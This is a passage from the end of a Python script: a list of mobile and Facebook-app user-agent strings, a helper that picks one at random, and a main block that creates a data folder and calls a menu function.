			"Mozilla/5.0 (Linux; Android 10; Redmi Note 9 Pro Build/QKQ1.191215.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.77 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/325.0.0.36.170;]",
			"[FBAN/FB4A,FBAV/222.0.0.48.113;FBBV/155323366;FBDM/{density=2.0,width=720,height=1360};FBLC/sr_RS;FBRV/156625696;FBCR/mt:s;FBMF/HUAWEI;FBBD/HUAWEI,.FBPN/com.facebook.katana;FBDV/LDN-L21;FBSV/8.0.0;FBOP/19.FBCA/armeabi-v7a:armeabi,]",
			"Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone11,8;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5;FBCR/]",
			"Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J320F Build/LMY47V) [FBAN/FB4A;FBAV/43.0.0.29.147;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/14274161;FBCR/Tele2 LT;FBMF/samsung;FBBD/samsung;FBDV/SM-J320F;FBSV/5.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]",
			"NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","NokiaX2-00/5.0 (08.35) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; en-us; nokiax2-00)","Mozilla/5.0 (Series40; Nokia501/1.0; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.0.0.0.67",
			"Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 Nokia5800d-1/60.0.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.1.33 Mobile Safari/533.4","Mozilla/5.0 (Series40; NokiaX2-02/10.90; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/1.0.2.26.11",
			"Mozilla/5.0 (Symbian/3; Series60/5.3 NokiaE7-00/111.040.1511; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/8.3.1.4 Mobile Safari/535.1","Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 Nokia5230/51.0.002; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.1.33 Mobile Safari/533.4", 
			"Mozilla/5.0 (Symbian/3; Series60/5.3 NokiaC6-01/111.040.1511; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/8.3.1.4 Mobile Safari/535.1", "Mozilla/5.0 (Series40; Nokia205.1/04.51; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.9.0.0.22", 
			"Mozilla/5.0 (Series40; Nokia303/14.87; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.9.0.0.22", "Mozilla/5.0 (Symbian/3; Series60/5.3 Nokia500/111.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/8.3.1.4 Mobile Safari/535.1","Mozilla/5.0 (Series40; Nokia110/03.51; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.0.2.62.10",
			"Mozilla/5.0 (Series40; Nokia200/11.81; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.9.0.0.22", "Mozilla/5.0 (Series40; Nokia205/03.18; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45","Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 NokiaC5-06/23.6.015; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.1.33 Mobile Safari/533.4", 
			"Mozilla/5.0 (Series40; Nokia200/11.81; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; Nokia208/03.39; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45","Mozilla/5.0 (Series40; Nokia2700c-2/07.80; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45",
			"Mozilla/5.0 (Series40; Nokia205/03.19; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45",  "Mozilla/5.0 (Series40; Nokia205.1/04.51; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; Nokia201/11.81; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.0.2.68.14",
		]
		rand_ua = random.choice(ugent)
		return rand_ua 

if __name__=="__main__":
	#os.system("clear")
	#os.system("git pull")
	try:os.mkdir('data')
	except:pass 
	menu()
